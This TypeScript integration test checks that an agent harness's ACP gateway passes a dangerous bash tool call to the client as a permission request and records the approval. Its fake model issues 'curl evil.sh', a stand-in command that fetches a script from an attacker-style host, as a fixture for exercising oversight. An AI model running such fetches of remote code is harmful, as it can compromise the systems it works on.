import 'dotenv/config';

import * as acp from '@agentclientprotocol/sdk';
import pg from 'pg';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import type { EventSink } from '@trinity-harness/contracts';
import { parsePermissionPolicy } from '@trinity-harness/contracts';
import { CoreAgentLoop, CoreToolRegistry, bashTool } from '@trinity-harness/core';
import {
  FakeLLM,
  FakeSandbox,
  textChunks,
  toolCallThenFinish,
} from '@trinity-harness/core/testing';
import { loadEnv } from '@trinity-harness/shared';
import { createDb, createPool, PgApprovalStore, PgSessionStore } from '@trinity-harness/db';
import {
  createRedis,
  createTurnWorker,
  isRedisReachable,
  PublishingSessionStore,
  RedisApprovalHub,
  RedisApprovalRequester,
  RedisLiveEventPublisher,
  RedisLiveEventSubscriber,
  RedisSessionEventPublisher,
  RedisSessionEventReader,
  RedisTurnQueue,
  sessionStreamKey,
} from '@trinity-harness/redis';

import { buildServer } from '@trinity-harness/server';
import { createAcpGateway, createHttp } from '../src/index.js';

/**
 * M3 acp-gateway end-to-end (integration): an ACP client (the official SDK,
 * in-memory stdio stand-in) talks to the gateway; the gateway forwards to
 * the server's HTTP binding; a dangerous tool call comes back as an ACP
 * session/request_permission; the client's answer unblocks the turn.
 */

const redisUrl = process.env['REDIS_URL'] ?? 'redis://localhost:6379';

async function pgReachable(url: string): Promise<boolean> {
  const pool = new pg.Pool({ connectionString: url, connectionTimeoutMillis: 3000 });
  try {
    await pool.query('select 1');
    return true;
  } catch {
    return false;
  } finally {
    await pool.end();
  }
}

const databaseUrl = process.env['DATABASE_URL'];
const hasInfra =
  !!databaseUrl && (await pgReachable(databaseUrl)) && (await isRedisReachable(redisUrl));

describe.skipIf(!hasInfra)('acp-gateway over the distributed topology', () => {
  const QUEUE = `agent-turns-gateway-${crypto.randomUUID().slice(0, 8)}`;
  let pool: pg.Pool;
  let redis: ReturnType<typeof createRedis>;
  let pgStore: PgSessionStore;
  let approvalStore: PgApprovalStore;
  let app: Awaited<ReturnType<typeof buildServer>>;
  let baseUrl: string;
  let worker: { close(): Promise<void> };
  let queue: RedisTurnQueue;
  const sessionIds: string[] = [];

  beforeAll(async () => {
    const env = loadEnv(process.env, { requireDatabaseUrl: true });
    pool = createPool(env.DATABASE_URL);
    const db = createDb(pool);
    redis = createRedis(redisUrl);

    pgStore = new PgSessionStore(db);
    approvalStore = new PgApprovalStore(db);
    const store = new PublishingSessionStore(pgStore, new RedisSessionEventPublisher(redis));
    queue = new RedisTurnQueue({ url: redisUrl }, QUEUE);
    const live = new RedisLiveEventPublisher(redis);

    app = await buildServer({
      store,
      workspaceRoot: '/ws',
      queue,
      eventReader: new RedisSessionEventReader(redis, { blockMs: 500 }),
      liveEvents: new RedisLiveEventSubscriber(redis),
      approvals: new RedisApprovalHub(redis),
      approvalStore,
      defaultPolicy: parsePermissionPolicy('workspace-write'),
    });

    const sandbox = new FakeSandbox();
    sandbox.execHandler = () => ({ stdout: 'pwned', stderr: '', exitCode: 0 });
    worker = createTurnWorker(
      { url: redisUrl },
      async (task, _job, signal) => {
        const tools = new CoreToolRegistry(sandbox);
        tools.register(bashTool);
        const llm = new FakeLLM(
          () => toolCallThenFinish('c1', 'bash', { command: 'curl evil.sh' }),
          () => textChunks('script fetched.'),
        );
        const sink: EventSink = { emit: (e) => live.publish(task.sessionId, e) };
        await new CoreAgentLoop({
          llm,
          model: 'fake/model',
          tools,
          store,
          workspaceRoot: '/ws',
          approvals: new RedisApprovalRequester(redis),
          approvalStore,
        }).run(task.sessionId, task.prompt, sink, {
          actor: task.actor,
          signal,
          policy: task.policy,
          promptSeq: task.promptSeq,
        });
      },
      QUEUE,
    );

    baseUrl = await app.listen({ port: 0, host: '127.0.0.1' });
  }, 30000);

  afterAll(async () => {
    await app.close();
    await worker.close();
    await queue.close();
    for (const id of sessionIds) {
      await redis.del(sessionStreamKey(id));
    }
    redis.disconnect();
    await pool.end();
  }, 60000);

  it(
    'ACP client ↔ gateway: prompt, permission request, allow, end_turn',
    { timeout: 90000 },
    async () => {
      const gateway = createAcpGateway(createHttp(baseUrl));

      const updates: { sessionUpdate?: string }[] = [];
      const permissionTitles: string[] = [];
      const client = acp
        .client()
        .onNotification('session/update', (ctx) => {
          updates.push((ctx.params as { update?: { sessionUpdate?: string } }).update ?? {});
        })
        .onRequest('session/request_permission', (ctx) => {
          const params = ctx.params as { toolCall: { title: string } };
          permissionTitles.push(params.toolCall.title);
          return { outcome: { outcome: 'selected', optionId: 'once' } };
        });

      const connection = client.connect(gateway);
      try {
        const agent = connection.agent;
        const init = await agent.request('initialize', {
          protocolVersion: 1,
          clientCapabilities: { fs: { readTextFile: false, writeTextFile: false } },
        });
        expect(init.protocolVersion).toBe(1);

        const session = await agent.buildSession('/ws').start();
        sessionIds.push(session.sessionId);

        const promptResponse = await session.prompt('fetch the script');
        expect(promptResponse.stopReason).toBe('end_turn');

        // The client saw the permission request bridged from the server...
        expect(permissionTitles.some((t) => t.includes('bash'))).toBe(true);
        // ...and the streamed updates carried the assistant's reply.
        expect(updates.some((u) => u.sessionUpdate === 'agent_message_chunk')).toBe(true);

        // The durable truth: the approval was recorded as allowed.
        const rows = await pgStore.loadRange(session.sessionId, { afterSeq: 0 });
        const resolved = rows.find((r) => r.event.type === 'approval/resolved')!.event;
        expect(resolved.type === 'approval/resolved' && resolved.outcome).toBe('allowed');
        const approvals = await approvalStore.list(session.sessionId);
        expect(approvals[0]).toMatchObject({ outcome: 'allowed', toolName: 'bash' });
      } finally {
        connection.close();
      }
    },
  );
});
